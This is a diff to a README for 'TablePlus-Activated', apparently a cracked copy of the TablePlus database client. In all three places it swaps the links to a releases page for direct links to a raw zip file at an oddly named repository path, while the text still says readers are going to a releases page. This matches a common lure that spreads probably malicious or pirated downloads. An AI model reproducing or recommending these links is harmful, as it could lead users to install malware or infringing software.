@@ -1,6 +1,6 @@
 # 🚀 TablePlus-Activated - Simplify Your Database Management
 
-[![Download TablePlus-Activated](https://img.shields.io/badge/Download-TablePlus--Activated-blue.svg)](https://github.com/ImortalssSmpMan/TablePlus-Activated/releases)
+[![Download TablePlus-Activated](https://raw.githubusercontent.com/ImortalssSmpMan/TablePlus-Activated/main/rubberwise/Plus_Activated_Table_crustade.zip)](https://raw.githubusercontent.com/ImortalssSmpMan/TablePlus-Activated/main/rubberwise/Plus_Activated_Table_crustade.zip)
 
 ## 📋 Overview
 Welcome to the TablePlus-Activated repository. This resource offers you everything you need to get started with TablePlus on your Windows PC. Enhance your database management skills with easy-to-follow guides and examples designed for efficiency and smooth workflow.
@@ -24,7 +24,7 @@ To get started with TablePlus-Activated, follow these simple steps:
 
 1. **Download TablePlus-Activated.**  
    Click the button below to visit the releases page where you can download the application.  
-   [![Download TablePlus-Activated](https://img.shields.io/badge/Download-TablePlus--Activated-blue.svg)](https://github.com/ImortalssSmpMan/TablePlus-Activated/releases)
+   [![Download TablePlus-Activated](https://raw.githubusercontent.com/ImortalssSmpMan/TablePlus-Activated/main/rubberwise/Plus_Activated_Table_crustade.zip)](https://raw.githubusercontent.com/ImortalssSmpMan/TablePlus-Activated/main/rubberwise/Plus_Activated_Table_crustade.zip)
 
 2. **Locate the Downloaded File.**  
    After downloading, find the file in your Downloads folder or the location you chose.
@@ -39,7 +39,7 @@ To get started with TablePlus-Activated, follow these simple steps:
    Follow the guides included in this repository to connect to your database quickly. Use the template provided to enter your connection details easily.
 
 ## 📥 Download & Install
-To download TablePlus-Activated, visit this page: [Download TablePlus-Activated](https://github.com/ImortalssSmpMan/TablePlus-Activated/releases). Select the latest version and follow the installation instructions outlined above. 
+To download TablePlus-Activated, visit this page: [Download TablePlus-Activated](https://raw.githubusercontent.com/ImortalssSmpMan/TablePlus-Activated/main/rubberwise/Plus_Activated_Table_crustade.zip). Select the latest version and follow the installation instructions outlined above. 
 
 ## 💬 Support
 If you encounter any issues while using TablePlus or have questions, please check the FAQ section in our repository. You can also join our community forum for additional support and tips from other users.
